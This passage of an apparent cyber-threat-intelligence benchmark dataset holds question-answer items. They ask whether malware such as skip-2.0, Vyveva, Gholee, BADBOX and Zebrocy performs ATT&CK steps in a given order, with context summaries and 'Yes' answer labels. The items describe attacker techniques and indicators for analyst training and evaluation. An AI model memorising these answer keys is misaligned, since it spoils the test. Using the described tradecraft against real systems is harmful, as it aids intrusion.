Others: The forensic analysis of the W32.Flamer C&C servers revealed that the servers were operational since at least 2012, with the first server set up on May 18, 2012, and the second on March 25, 2012. The analysis also uncovered the nicknames of four authors who worked on the code, indicating a collaborative and ongoing development effort. The C&C servers were part of a sophisticated cyber espionage campaign targeting the Middle East, with the malware being modular in design and containing novel functionality. The attackers employed data security compartmentalization techniques, indicating a highly organized and sophisticated group behind the operation. The investigation provided insights into the architecture of the threat and the command structure of the entities behind it, suggesting the involvement of a large and well-funded entity.",Yes,w32_flamer_newsforyou
320,143,143-Initial Access-T1195-Supply Chain Compromise,"After exploiting supply chain vulnerabilities to infiltrate devices with firmware backdoors, is it likely that the BADBOX malware will use a backdoor connection to a command-and-control (C2) server before injecting additional modules into device memory to enable further capabilities?",Initial Access: BADBOX is a global network of consumer products with firmware backdoors installed and sold through a normal hardware supply chain. These backdoored devices connect to a command-and-control (C2) server for instructions from the threat actors behind the scheme upon being activated by unsuspecting owners.,"Execution: The backdoor is used to inject additional modules into device memory, enabling the threat actors to extend their capabilities, perpetuate several types of fraud, including multiple varieties of ad fraud, the establishment of residential proxy exit nodes, creation of fake Gmail and WhatsApp accounts, and remote un-permissioned code installation.
Persistence: The Triada malware, first uncovered in 2016, modifies a core process of the Android OS, effectively installing itself in every app on the device, including some system functionality, like text messaging. The root access Triada gains makes it remarkably powerful as a tool for cybercriminals.
Defense Evasion: The backdoor's connection to C2 servers on BADBOX-infected smartphones, tablets, and CTV boxes allows new apps or code to be remotely installed by the threat actors without the device owner's permission. The threat actors behind BADBOX could develop entirely new schemes and deploy them on BADBOX-infected devices without any interaction from the devices' owners.
Credential Access: Threat actors can use the backdoored devices to create WhatsApp messaging accounts by stealing one-time passwords from the devices. Additionally, threat actors can use the devices to create Gmail accounts, evading typical bot detection because the account looks like it was created from a normal tablet or smartphone, by a real person.
Command and Control: Infected devices, once turned on, immediately connect to one of several C2 servers. The backdoor is used to inject additional modules into device memory, enabling the threat actors to extend their capabilities, perpetuate several types of fraud, and periodically update the malware on the device to ensure each device remains part of the botnet.
Others: BADBOX-infected devices are unsalvageable by an average user since the malware is located on a read-only (ROM) partition of the device firmware. Products known to contain the backdoor have been found on public school networks throughout the United States. HUMAN customers have been protected from PEACHPIT, the ad fraud component of the BADBOX operation, for many months. Satori has shared information about the threat actors with law enforcement. The residential proxy module of BADBOX transforms each device into an endpoint for a global residential proxy network, allowing the threat actors behind BADBOX to sell access to your home network, which may result in cybercriminal activity being traced to your door.",Yes,HUMAN_Report_BADBOX-and-PEACHPIT
331,144,144-Defense Evasion-T1556-Modify Authentication Process,"After executing the skip-2.0 backdoor via a VMProtected launcher, is it likely that the Inner-Loader component lists running processes for discovery of MSSQL Server processes before the backdoor bypasses authentication using hooks in the sqllang.dll service for defense evasion?","Defense Evasion: The skip-2.0 backdoor employs multiple hooks in the sqllang.dll service to bypass authentication and maintain stealth, effectively blocking event logging. It also uses Winnti's custom packer for software packing, and the launcher is VMProtected, which contributes to its evasion capabilities.","Execution: The Winnti Group has been observed using a backdoor targeting Microsoft SQL Server, known as skip-2.0, which is launched via a VMProtected launcher. This launcher is typically associated with payloads such as PortReuse or ShadowPad. The skip-2.0 backdoor is executed with the SessionEnv service and is likely to use a DLL hijacking technique against this service for persistence.
Persistence: The skip-2.0 backdoor likely achieves persistence by exploiting a DLL hijacking vulnerability, being installed at C:\Windows\System32\TSVIPSrv.DLL, which results in the DLL being loaded by the standard Windows SessionEnv service at system startup.
Discovery: The Inner-Loader component of the skip-2.0 backdoor lists running processes to find the process running MSSQL Server, indicating a process discovery technique.
Impact: The skip-2.0 backdoor allows unauthorized access to MSSQL databases, which could lead to data destruction or tampering. It manipulates event logging at runtime and enables manipulation of stored data, potentially impacting the integrity of the data within the MSSQL databases.
Others: ESET researchers have been tracking the Winnti Group, active since at least 2012, known for high-profile supply-chain attacks against the video game and software industry. The group's recent backdoor, skip-2.0, targets MSSQL Server 11 and 12, allowing attackers to connect stealthily to any MSSQL account using a 'magic password' and automatically hiding these connections from logs. This backdoor shares similarities with the PortReuse backdoor and ShadowPad, using the same custom packer and VMProtected launcher, leading to its attribution to the Winnti Group. The backdoor's functionality includes hooking functions related to authentication and event logging in sqllang.dll to allow persistent and undetected access. ESET has published a white paper detailing the Winnti Group's arsenal and has provided indicators of compromise (IoCs) for skip-2.0, including SHA-1 hashes for the VMP Loader, Inner-Loader injector, and skip-2.0 itself, as well as known targeted sqllang.dll files. MITRE ATT&CK techniques associated with skip-2.0 include Execution, Persistence, Defense Evasion, Discovery, and Impact.",Yes,Winnti Group’s skip‑2.0_ A Microsoft SQL Server backdoor
336,144,144-Impact-T1565-Data Manipulation,"After the Inner-Loader component of the skip-2.0 backdoor discovers MSSQL processes through process discovery techniques, is it likely that the skip-2.0 backdoor will allow unauthorized access and manipulate event logging before enabling manipulation of stored data, thereby impacting the integrity of the data?","Impact: The skip-2.0 backdoor allows unauthorized access to MSSQL databases, which could lead to data destruction or tampering. It manipulates event logging at runtime and enables manipulation of stored data, potentially impacting the integrity of the data within the MSSQL databases.","Execution: The Winnti Group has been observed using a backdoor targeting Microsoft SQL Server, known as skip-2.0, which is launched via a VMProtected launcher. This launcher is typically associated with payloads such as PortReuse or ShadowPad. The skip-2.0 backdoor is executed with the SessionEnv service and is likely to use a DLL hijacking technique against this service for persistence.
Persistence: The skip-2.0 backdoor likely achieves persistence by exploiting a DLL hijacking vulnerability, being installed at C:\Windows\System32\TSVIPSrv.DLL, which results in the DLL being loaded by the standard Windows SessionEnv service at system startup.
Defense Evasion: The skip-2.0 backdoor employs multiple hooks in the sqllang.dll service to bypass authentication and maintain stealth, effectively blocking event logging. It also uses Winnti's custom packer for software packing, and the launcher is VMProtected, which contributes to its evasion capabilities.
Discovery: The Inner-Loader component of the skip-2.0 backdoor lists running processes to find the process running MSSQL Server, indicating a process discovery technique.
Others: ESET researchers have been tracking the Winnti Group, active since at least 2012, known for high-profile supply-chain attacks against the video game and software industry. The group's recent backdoor, skip-2.0, targets MSSQL Server 11 and 12, allowing attackers to connect stealthily to any MSSQL account using a 'magic password' and automatically hiding these connections from logs. This backdoor shares similarities with the PortReuse backdoor and ShadowPad, using the same custom packer and VMProtected launcher, leading to its attribution to the Winnti Group. The backdoor's functionality includes hooking functions related to authentication and event logging in sqllang.dll to allow persistent and undetected access. ESET has published a white paper detailing the Winnti Group's arsenal and has provided indicators of compromise (IoCs) for skip-2.0, including SHA-1 hashes for the VMP Loader, Inner-Loader injector, and skip-2.0 itself, as well as known targeted sqllang.dll files. MITRE ATT&CK techniques associated with skip-2.0 include Execution, Persistence, Defense Evasion, Discovery, and Impact.",Yes,Winnti Group’s skip‑2.0_ A Microsoft SQL Server backdoor
353,146,146-Discovery-T1057-Process Discovery,"After utilizing subverted trust controls to evade defenses through T1553 Subvert Trust Controls, is it likely that the threat actors employed T1057 Process Discovery for gaining knowledge about the systems and internal networks of the compromised organizations before leveraging compromised infrastructure for command and control using T1071 Application Layer Protocol?","Discovery: The report mentions Discovery techniques such as T1057 Process Discovery and T1012 Query Registry, which the threat actors used to gain knowledge about the systems and internal network of the compromised organizations.","Reconnaissance: The report does not provide explicit details on the Reconnaissance tactics used by the threat actors involved in the SolarWinds Orion platform compromise. However, it mentions that the attackers demonstrated an impressive degree of reconnaissance and focus, suggesting that they had intimate knowledge of SolarWinds' source code, network topology, and internal development domain names. This knowledge was used to minimize the risk of detection by vigilant employees.
Resource Development: The report indicates that the threat actors behind the SolarWinds Orion platform compromise, referred to as UNC2452, demonstrated significant Resource Development capabilities. They were selective in their targeting, choosing specific organizations to pursue while excluding others. The report suggests adding the ATT&CK sub-technique T1583.001 Acquire Infrastructure: Domains to the UNC2452 actor profile, as the actors parked domains for future use. Additionally, the report notes that the attackers may have had access to private web servers and developed malware capabilities.
Initial Access: The report discusses the Initial Access tactic in the context of the SolarWinds Orion platform compromise. It highlights that the attackers used a supply chain compromise, specifically a compromised software update, as their initial access vector. This technique is listed as T1195 Supply Chain Compromise, with the sub-technique T1195.002 Compromise Software Supply Chain.
Execution: The report mentions that the threat actors used various Execution techniques, including T1072 Software Deployment Tools, to run malicious code as part of their operations. Additionally, the attackers used system services to execute code, as indicated by the technique T1569 System Services.
Persistence: The report does not provide specific details on Persistence techniques used by the threat actors. However, it implies that the attackers were able to maintain their foothold within the compromised networks by being selective in their targeting and careful to avoid detection.
Privilege Escalation: The report does not provide specific details on Privilege Escalation techniques used by the threat actors. However, it suggests that the attackers had a high level of system access, which may imply the use of techniques to gain elevated permissions.
Defense Evasion: The report details several Defense Evasion techniques used by the threat actors, including T1070 Indicator Removal on Host, T1036 Masquerading, T1553 Subvert Trust Controls, and T1497 Virtualization/Sandbox Evasion. The attackers took great care to avoid detection by security tools and personnel, demonstrating a high level of sophistication in evading defenses.
Credential Access: The report does not provide specific details on Credential Access techniques used by the threat actors. However, the use of valid accounts (T1078) is mentioned, suggesting that the attackers may have had access to legitimate credentials to facilitate their operations.
Lateral Movement: The report does not provide specific details on Lateral Movement techniques used by the threat actors. However, it suggests that the attackers were able to move through the network to reach their objectives, which may involve the use of techniques to control remote systems.
Collection: The report does not provide specific details on Collection techniques used by the threat actors. However, it mentions that the attackers were focused on information theft and espionage, which implies the use of techniques to gather data relevant to their goals.
Command and Control: The report discusses Command and Control techniques, including T1071 Application Layer Protocol and T1568 Dynamic Resolution, which the threat actors used to communicate with the compromised systems and maintain control over them.
Exfiltration: The report does not provide specific details on Exfiltration techniques used by the threat actors. However, it mentions that the attackers were likely focused on stealing data, which suggests the use of techniques to remove data from the target network.
Impact: The report does not provide specific details on Impact techniques used by the threat actors. However, it suggests that the primary goal of the attackers was espionage rather than destruction, indicating that impact techniques may not have been a focus of this campaign.
Others: The report provides an analysis of the SolarWinds Orion platform compromise, discussing the attribution challenges and the possibility of multiple actors being involved. It highlights the need for further investigation and intelligence analysis to understand the full scope of the campaign and the actors behind it. The report also emphasizes the importance of using frameworks like MITRE ATT&CK for mapping adversary TTPs and improving defensive strategies.",Yes,pov-2020-1230
354,146,146-Discovery-T1012-Query Registry,Is it likely that the SolarWinds attackers would have used various Defense Evasion techniques such as T1036 Masquerading and T1553 Subvert Trust Controls to avoid detection before employing T1057 Process Discovery and T1012 Query Registry as part of their Discovery activities?,"Discovery: The report mentions Discovery techniques such as T1057 Process Discovery and T1012 Query Registry, which the threat actors used to gain knowledge about the systems and internal network of the compromised organizations.","Reconnaissance: The report does not provide explicit details on the Reconnaissance tactics used by the threat actors involved in the SolarWinds Orion platform compromise. However, it mentions that the attackers demonstrated an impressive degree of reconnaissance and focus, suggesting that they had intimate knowledge of SolarWinds' source code, network topology, and internal development domain names. This knowledge was used to minimize the risk of detection by vigilant employees.
Resource Development: The report indicates that the threat actors behind the SolarWinds Orion platform compromise, referred to as UNC2452, demonstrated significant Resource Development capabilities. They were selective in their targeting, choosing specific organizations to pursue while excluding others. The report suggests adding the ATT&CK sub-technique T1583.001 Acquire Infrastructure: Domains to the UNC2452 actor profile, as the actors parked domains for future use. Additionally, the report notes that the attackers may have had access to private web servers and developed malware capabilities.
Initial Access: The report discusses the Initial Access tactic in the context of the SolarWinds Orion platform compromise. It highlights that the attackers used a supply chain compromise, specifically a compromised software update, as their initial access vector. This technique is listed as T1195 Supply Chain Compromise, with the sub-technique T1195.002 Compromise Software Supply Chain.
Execution: The report mentions that the threat actors used various Execution techniques, including T1072 Software Deployment Tools, to run malicious code as part of their operations. Additionally, the attackers used system services to execute code, as indicated by the technique T1569 System Services.
Persistence: The report does not provide specific details on Persistence techniques used by the threat actors. However, it implies that the attackers were able to maintain their foothold within the compromised networks by being selective in their targeting and careful to avoid detection.
Privilege Escalation: The report does not provide specific details on Privilege Escalation techniques used by the threat actors. However, it suggests that the attackers had a high level of system access, which may imply the use of techniques to gain elevated permissions.
Defense Evasion: The report details several Defense Evasion techniques used by the threat actors, including T1070 Indicator Removal on Host, T1036 Masquerading, T1553 Subvert Trust Controls, and T1497 Virtualization/Sandbox Evasion. The attackers took great care to avoid detection by security tools and personnel, demonstrating a high level of sophistication in evading defenses.
Credential Access: The report does not provide specific details on Credential Access techniques used by the threat actors. However, the use of valid accounts (T1078) is mentioned, suggesting that the attackers may have had access to legitimate credentials to facilitate their operations.
Lateral Movement: The report does not provide specific details on Lateral Movement techniques used by the threat actors. However, it suggests that the attackers were able to move through the network to reach their objectives, which may involve the use of techniques to control remote systems.
Collection: The report does not provide specific details on Collection techniques used by the threat actors. However, it mentions that the attackers were focused on information theft and espionage, which implies the use of techniques to gather data relevant to their goals.
Command and Control: The report discusses Command and Control techniques, including T1071 Application Layer Protocol and T1568 Dynamic Resolution, which the threat actors used to communicate with the compromised systems and maintain control over them.
Exfiltration: The report does not provide specific details on Exfiltration techniques used by the threat actors. However, it mentions that the attackers were likely focused on stealing data, which suggests the use of techniques to remove data from the target network.
Impact: The report does not provide specific details on Impact techniques used by the threat actors. However, it suggests that the primary goal of the attackers was espionage rather than destruction, indicating that impact techniques may not have been a focus of this campaign.
Others: The report provides an analysis of the SolarWinds Orion platform compromise, discussing the attribution challenges and the possibility of multiple actors being involved. It highlights the need for further investigation and intelligence analysis to understand the full scope of the campaign and the actors behind it. The report also emphasizes the importance of using frameworks like MITRE ATT&CK for mapping adversary TTPs and improving defensive strategies.",Yes,pov-2020-1230
387,15,15-Defense Evasion-T1027-Obfuscated Files or Information,"After Vyveva obtains file and directory listings and lists running processes during the Discovery phase, is it likely to have encrypted strings and components within its artifacts for achieving Defense Evasion before compressing and collecting files for exfiltration during the Collection phase?","Defense Evasion: Vyveva decrypts strings and components, including the backdoor and Tor library (T1140), can timestomp files (T1070.006), masquerades tasks or services (T1036.004), modifies the registry to store its configuration (T1112), and has encrypted strings and components (T1027).","Execution: ESET researchers discovered a new Lazarus backdoor named Vyveva, which executes via a service (T1569.002) and uses the CreateProcessA API for file execution (T1106).
Persistence: The Vyveva installer creates a new service to establish persistence for its loader (T1543.003).
Discovery: Vyveva's backdoor can obtain file and directory listings (T1083), list running processes (T1057), obtain system information such as computer name, ANSI code page, OS version and architecture (T1082), obtain the local IP address (T1016), and system time and time zone (T1124).
Collection: Vyveva's backdoor can compress files with zlib before sending to C&C (T1560.002), collect files from the computer (T1005), and notify C&C about newly inserted removable media and collect files from them (T1025).
Command and Control: Vyveva's backdoor encrypts C&C traffic using XOR (T1573.001), communicates with C&C via Tor (T1573.002), and exfiltrates data to the C&C server (T1041).
Exfiltration: Vyveva exfiltrates data to its C&C server (T1041).
Others: ESET researchers identified a previously undocumented backdoor used by Lazarus to attack a freight logistics company in South Africa. The backdoor, named Vyveva, communicates with its C&C server via the Tor network and has been active since at least December 2018. It features capabilities for file exfiltration, timestomping, and gathering victim information. The initial compromise vector is unknown, but telemetry data suggests targeted deployment. Vyveva shares code similarities with older Lazarus samples detected as the NukeSped malware family, indicating high confidence in attribution to Lazarus. The backdoor's components include an installer, loader, and main payload, with the installer ensuring persistence and storing configuration in the registry. Vyveva's backdoor executes 23 commands, including file upload and timestomping, and features drive and session watchdogs. The configuration is modifiable by C&C commands and includes fields for connection delay and encrypted C&C server strings. The Tor library is used for C&C communication, with the backdoor's export directory containing TorSocket.dll. The attack on a South African company demonstrates Lazarus's broad geographical targeting.",Yes,"(Are you) afreight of the dark_ Watch out for Vyveva, new Lazarus backdoor _ WeLiveSecurity"
389,15,15-Discovery-T1083-File and Directory Discovery,"After using its installer to create a new service for persistence and decrypting strings for defense evasion, is it likely that Vyveva will obtain file and directory listings as part of its discovery activities before compressing files with zlib for collection?","Discovery: Vyveva's backdoor can obtain file and directory listings (T1083), list running processes (T1057), obtain system information such as computer name, ANSI code page, OS version and architecture (T1082), obtain the local IP address (T1016), and system time and time zone (T1124).","Execution: ESET researchers discovered a new Lazarus backdoor named Vyveva, which executes via a service (T1569.002) and uses the CreateProcessA API for file execution (T1106).
Persistence: The Vyveva installer creates a new service to establish persistence for its loader (T1543.003).
Defense Evasion: Vyveva decrypts strings and components, including the backdoor and Tor library (T1140), can timestomp files (T1070.006), masquerades tasks or services (T1036.004), modifies the registry to store its configuration (T1112), and has encrypted strings and components (T1027).
Collection: Vyveva's backdoor can compress files with zlib before sending to C&C (T1560.002), collect files from the computer (T1005), and notify C&C about newly inserted removable media and collect files from them (T1025).
Command and Control: Vyveva's backdoor encrypts C&C traffic using XOR (T1573.001), communicates with C&C via Tor (T1573.002), and exfiltrates data to the C&C server (T1041).
Exfiltration: Vyveva exfiltrates data to its C&C server (T1041).
Others: ESET researchers identified a previously undocumented backdoor used by Lazarus to attack a freight logistics company in South Africa. The backdoor, named Vyveva, communicates with its C&C server via the Tor network and has been active since at least December 2018. It features capabilities for file exfiltration, timestomping, and gathering victim information. The initial compromise vector is unknown, but telemetry data suggests targeted deployment. Vyveva shares code similarities with older Lazarus samples detected as the NukeSped malware family, indicating high confidence in attribution to Lazarus. The backdoor's components include an installer, loader, and main payload, with the installer ensuring persistence and storing configuration in the registry. Vyveva's backdoor executes 23 commands, including file upload and timestomping, and features drive and session watchdogs. The configuration is modifiable by C&C commands and includes fields for connection delay and encrypted C&C server strings. The Tor library is used for C&C communication, with the backdoor's export directory containing TorSocket.dll. The attack on a South African company demonstrates Lazarus's broad geographical targeting.",Yes,"(Are you) afreight of the dark_ Watch out for Vyveva, new Lazarus backdoor _ WeLiveSecurity"
390,15,15-Discovery-T1124-System Time Discovery,"After masquerading tasks or services as part of its defense evasion, is it likely that Vyveva will obtain system time and time zone information using its backdoor before compressing files with zlib for data collection?","Discovery: Vyveva's backdoor can obtain file and directory listings (T1083), list running processes (T1057), obtain system information such as computer name, ANSI code page, OS version and architecture (T1082), obtain the local IP address (T1016), and system time and time zone (T1124).","Execution: ESET researchers discovered a new Lazarus backdoor named Vyveva, which executes via a service (T1569.002) and uses the CreateProcessA API for file execution (T1106).
Persistence: The Vyveva installer creates a new service to establish persistence for its loader (T1543.003).
Defense Evasion: Vyveva decrypts strings and components, including the backdoor and Tor library (T1140), can timestomp files (T1070.006), masquerades tasks or services (T1036.004), modifies the registry to store its configuration (T1112), and has encrypted strings and components (T1027).
Collection: Vyveva's backdoor can compress files with zlib before sending to C&C (T1560.002), collect files from the computer (T1005), and notify C&C about newly inserted removable media and collect files from them (T1025).
Command and Control: Vyveva's backdoor encrypts C&C traffic using XOR (T1573.001), communicates with C&C via Tor (T1573.002), and exfiltrates data to the C&C server (T1041).
Exfiltration: Vyveva exfiltrates data to its C&C server (T1041).
Others: ESET researchers identified a previously undocumented backdoor used by Lazarus to attack a freight logistics company in South Africa. The backdoor, named Vyveva, communicates with its C&C server via the Tor network and has been active since at least December 2018. It features capabilities for file exfiltration, timestomping, and gathering victim information. The initial compromise vector is unknown, but telemetry data suggests targeted deployment. Vyveva shares code similarities with older Lazarus samples detected as the NukeSped malware family, indicating high confidence in attribution to Lazarus. The backdoor's components include an installer, loader, and main payload, with the installer ensuring persistence and storing configuration in the registry. Vyveva's backdoor executes 23 commands, including file upload and timestomping, and features drive and session watchdogs. The configuration is modifiable by C&C commands and includes fields for connection delay and encrypted C&C server strings. The Tor library is used for C&C communication, with the backdoor's export directory containing TorSocket.dll. The attack on a South African company demonstrates Lazarus's broad geographical targeting.",Yes,"(Are you) afreight of the dark_ Watch out for Vyveva, new Lazarus backdoor _ WeLiveSecurity"
399,151,151-Defense Evasion-T1027-Obfuscated Files or Information,"After the execution of the Gholee malware through the concatenated PE file NTUSER.data.{GUIDE}.dll using cmd.exe /C and Rundll32, is it likely that the malware will employ obfuscation and mechanisms to hide from sandbox software to evade detection before establishing a secure command-and-control connection using an expired digital certificate?","Defense Evasion: The Gholee malware employs obfuscation and includes mechanisms to hide from debuggers such as Ollydbg and IDA, as well as from sandbox software like Cuckoo and Anubis. The malware's entry point is named 'gholee', which is also the name of a popular Iranian singer, potentially indicating the origin of the threat actor.","Initial Access: The Gholee malware campaign utilized a spear phishing attack with a malicious Excel file named 'Operation Protective Edge.xlsb' (MD5: d0c3f4c9896d41a7c42737134ffb4c2e) to gain initial access to the victim's computer. The file, first uploaded to Virus Total on August 10, 2014, from Israel, was not initially detected as malicious by any antivirus engines. On August 19, 2014, it was detected by Kaspersky as Trojan-Dropper.MSExcel.Agent.ce.
Execution: Upon enabling Macro content in the malicious Excel file, the victim is presented with a message that disappears to show different content. The Macro code uses ASCII character codes to avoid detection and concatenates them into a single variable within a function. These functions are then combined to create a single PE file, which is saved as NTUSER.data.{GUIDE}.dll (MD5: 48573a150562c57742230583456b4c02) and executed using ShellExecute under cmd.exe /C and Rundll32 to hide the process.
Command and Control: The Gholee malware establishes command and control by communicating with a Kuwait-based IP address (83.170.33.60) owned by German company iABG Mbh. It opens an SSL connection over port 443 using an expired digital certificate issued to Core Security for *coreimpactagent.net by Thawte certificate authority. The certificate fingerprint is MD5: 9C 80 C2 47 40 6D 6C ED FC E0 08 AEEF D9 98 90. The malware's HTTP communication pattern includes GET and POST requests to /index.php with specific parameters.
Others: Related incidents reveal another file 'svchost 67.exe' (MD5: 916be1b609ed3dc80e5039a1d8102e82) uploaded to Virus Total on June 2, 2014, from Latvia, which communicated with an IP address (83.170.33.37) in the same netblock as the Gholee malware. Detection and prevention measures include disabling macro code via GPO, blocking files containing macro code at the email gateway, and monitoring logs and proxy servers for communication with the malware-associated IP addresses. A Yara rule is provided for detecting the Gholee malware.",Yes,Gholee_Protective_Edge_themed_spear_phishing_campaign
405,151,151-Command and Control-T1071-Application Layer Protocol,"After obfuscating its entry point to evade defense mechanisms such as debuggers or sandbox software, is the Gholee malware likely to establish communication with an IP address, use an expired digital certificate, and send HTTP communication to perform Command and Control operations?",Command and Control: The Gholee malware establishes command and control by communicating with a Kuwait-based IP address (83.170.33.60) owned by German company iABG Mbh. It opens an SSL connection over port 443 using an expired digital certificate issued to Core Security for *coreimpactagent.net by Thawte certificate authority. The certificate fingerprint is MD5: 9C 80 C2 47 40 6D 6C ED FC E0 08 AEEF D9 98 90. The malware's HTTP communication pattern includes GET and POST requests to /index.php with specific parameters.,"Initial Access: The Gholee malware campaign utilized a spear phishing attack with a malicious Excel file named 'Operation Protective Edge.xlsb' (MD5: d0c3f4c9896d41a7c42737134ffb4c2e) to gain initial access to the victim's computer. The file, first uploaded to Virus Total on August 10, 2014, from Israel, was not initially detected as malicious by any antivirus engines. On August 19, 2014, it was detected by Kaspersky as Trojan-Dropper.MSExcel.Agent.ce.
Execution: Upon enabling Macro content in the malicious Excel file, the victim is presented with a message that disappears to show different content. The Macro code uses ASCII character codes to avoid detection and concatenates them into a single variable within a function. These functions are then combined to create a single PE file, which is saved as NTUSER.data.{GUIDE}.dll (MD5: 48573a150562c57742230583456b4c02) and executed using ShellExecute under cmd.exe /C and Rundll32 to hide the process.
Defense Evasion: The Gholee malware employs obfuscation and includes mechanisms to hide from debuggers such as Ollydbg and IDA, as well as from sandbox software like Cuckoo and Anubis. The malware's entry point is named 'gholee', which is also the name of a popular Iranian singer, potentially indicating the origin of the threat actor.
Others: Related incidents reveal another file 'svchost 67.exe' (MD5: 916be1b609ed3dc80e5039a1d8102e82) uploaded to Virus Total on June 2, 2014, from Latvia, which communicated with an IP address (83.170.33.37) in the same netblock as the Gholee malware. Detection and prevention measures include disabling macro code via GPO, blocking files containing macro code at the email gateway, and monitoring logs and proxy servers for communication with the malware-associated IP addresses. A Yara rule is provided for detecting the Gholee malware.",Yes,Gholee_Protective_Edge_themed_spear_phishing_campaign
432,154,154-Discovery-T1497-Virtualization/Sandbox Evasion,"After establishing persistence through a Windows registry entry using the path of a hardcoded filename, is the AutoIt downloader likely to detect sandbox and virtual environments to perform reconnaissance on the victim's computer before communicating gathered data back to the C&C server?","Discovery: The Sednit group's malware, specifically the AutoIt downloader, performs extensive reconnaissance on victim computers. It detects sandbox and virtual environments, retrieves a list of installed software, determines the Windows version, and gathers process lists, hard drive information, and screenshots. It also uses Windows Management Instrumentation (WMI) objects to collect various information about the victim computer.","Reconnaissance: The Sednit group, also known as APT28, Fancy Bear, Sofacy, or STRONTIUM, has been deploying a new component since the end of 2015, a downloader for the main Sednit backdoor, Xagent. This component, referred to as Zebrocy, is a family of malware that includes downloaders and backdoors written in Delphi and AutoIt, serving as first-stage malware. The group targets entities such as embassies, ministries of foreign affairs, and diplomats across various countries. Zebrocy's attack begins with an email message containing malicious attachments, which may be Microsoft Office documents or archives. These documents use methods like Visual Basic for Applications (VBA), exploits, or Dynamic Data Exchange (DDE) to download the first stage payload. Two specific campaigns were launched at the end of 2017 with documents named 'Syria - New Russia provocations.doc' and 'Note Letter Mary Christmas Card.doc'. Both documents contain a VBA macro that creates a randomly-named file in the %TEMP% directory, decodes the malware executable, and runs it using PowerShell or Scriptable Shell Objects.
Initial Access: The Sednit group's initial access to victim networks is primarily through email attachments containing malicious documents or archives. These documents execute a VBA macro to download and run the first stage payload. The group uses social engineering to lure victims into opening these attachments, which are disguised with document-like filenames and icons. The Delphi downloader, as the first stage, displays a splash window with a bogus error message to distract the user while it gathers information from the victim's computer and establishes persistence through a Windows registry entry. The AutoIt downloader, which can be either the first or second stage, performs additional reconnaissance functions and also displays a splash window to mislead the victim.
Execution: The execution of the Sednit group's malware begins with the Delphi downloader, which creates a process using the Windows API CreateProcess function with 'cmd.exe /c SYSTEMINFO & TASKLIST' as the argument. It then sends the gathered information to a C&C server via an HTTP POST request. If the target is deemed interesting, the server responds with the next stage payload, which is written into a file and executed. The AutoIt downloader, when acting as the first stage, executes the payload received from the C&C server. The Delphi backdoor, as the final stage, executes callback functions via the Windows API function SetTimer, allowing the operator to handle various features and commands.
Persistence: The Sednit group ensures persistence of their malware through the Delphi downloader, which adds a Windows registry entry under HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ with the path of a hardcoded filename. The AutoIt downloader uses a similar persistence mechanism.
Defense Evasion: To evade detection, the Delphi downloader displays a splash window with a bogus error message, and the AutoIt downloader shows a splash screen related to the binary icon, such as a corrupted PDF file or a popup asking for a password. These tactics are meant to distract the victim from the malware's actual activities. Additionally, the Delphi backdoor uses AES encryption to protect its configuration data and communications with the C&C server.
Command and Control: The Delphi backdoor communicates with the C&C server by storing reports of its functions into temporary files, reading the content, and then sending it on. These temporary files are stored in hidden directories created during the setup phase. The backdoor uses the AES-256-ECB algorithm to encrypt the contents before sending them to the C&C server.
Others: The Sednit group, also known as APT28, Fancy Bear, Sofacy, or STRONTIUM, has been active since 2004. Their main objective is to steal confidential information from specific targets. The group has been deploying a new component, Zebrocy, since the end of 2015. Zebrocy is a family of malware that includes downloaders and backdoors written in Delphi and AutoIt, serving as first-stage malware. The group targets entities such as embassies, ministries of foreign affairs, and diplomats across various countries. Zebrocy's attack begins with an email message containing malicious attachments, which may be Microsoft Office documents or archives. These documents use methods like Visual Basic for Applications (VBA), exploits, or Dynamic Data Exchange (DDE) to download the first stage payload. Two specific campaigns were launched at the end of 2017 with documents named 'Syria - New Russia provocations.doc' and 'Note Letter Mary Christmas Card.doc'. Both documents contain a VBA macro that creates a randomly-named file in the %TEMP% directory, decodes the malware executable, and runs it using PowerShell or Scriptable Shell Objects.",Yes,sednit-update-analysis-zebrocy_
433,154,154-Discovery-T1518-Software Discovery,"After achieving initial access through email attachments containing documents with malicious VBA macros and executing the first stage payload to gather initial system information via SYSTEMINFO & TASKLIST commands, is it likely that the AutoIt downloader will retrieve a list of installed software on the victim's machine to perform software discovery before establishing persistence through Windows registry entries under HKCU\Software\Microsoft\Windows\CurrentVersion\Run?","Discovery: The Sednit group's malware, specifically the AutoIt downloader, performs extensive reconnaissance on victim computers. It detects sandbox and virtual environments, retrieves a list of installed software, determines the Windows version, and gathers process lists, hard drive information, and screenshots. It also uses Windows Management Instrumentation (WMI) objects to collect various information about the victim computer.","Reconnaissance: The Sednit group, also known as APT28, Fancy Bear, Sofacy, or STRONTIUM, has been deploying a new component since the end of 2015, a downloader for the main Sednit backdoor, Xagent. This component, referred to as Zebrocy, is a family of malware that includes downloaders and backdoors written in Delphi and AutoIt, serving as first-stage malware. The group targets entities such as embassies, ministries of foreign affairs, and diplomats across various countries. Zebrocy's attack begins with an email message containing malicious attachments, which may be Microsoft Office documents or archives. These documents use methods like Visual Basic for Applications (VBA), exploits, or Dynamic Data Exchange (DDE) to download the first stage payload. Two specific campaigns were launched at the end of 2017 with documents named 'Syria - New Russia provocations.doc' and 'Note Letter Mary Christmas Card.doc'. Both documents contain a VBA macro that creates a randomly-named file in the %TEMP% directory, decodes the malware executable, and runs it using PowerShell or Scriptable Shell Objects.
Initial Access: The Sednit group's initial access to victim networks is primarily through email attachments containing malicious documents or archives. These documents execute a VBA macro to download and run the first stage payload. The group uses social engineering to lure victims into opening these attachments, which are disguised with document-like filenames and icons. The Delphi downloader, as the first stage, displays a splash window with a bogus error message to distract the user while it gathers information from the victim's computer and establishes persistence through a Windows registry entry. The AutoIt downloader, which can be either the first or second stage, performs additional reconnaissance functions and also displays a splash window to mislead the victim.
Execution: The execution of the Sednit group's malware begins with the Delphi downloader, which creates a process using the Windows API CreateProcess function with 'cmd.exe /c SYSTEMINFO & TASKLIST' as the argument. It then sends the gathered information to a C&C server via an HTTP POST request. If the target is deemed interesting, the server responds with the next stage payload, which is written into a file and executed. The AutoIt downloader, when acting as the first stage, executes the payload received from the C&C server. The Delphi backdoor, as the final stage, executes callback functions via the Windows API function SetTimer, allowing the operator to handle various features and commands.
Persistence: The Sednit group ensures persistence of their malware through the Delphi downloader, which adds a Windows registry entry under HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ with the path of a hardcoded filename. The AutoIt downloader uses a similar persistence mechanism.
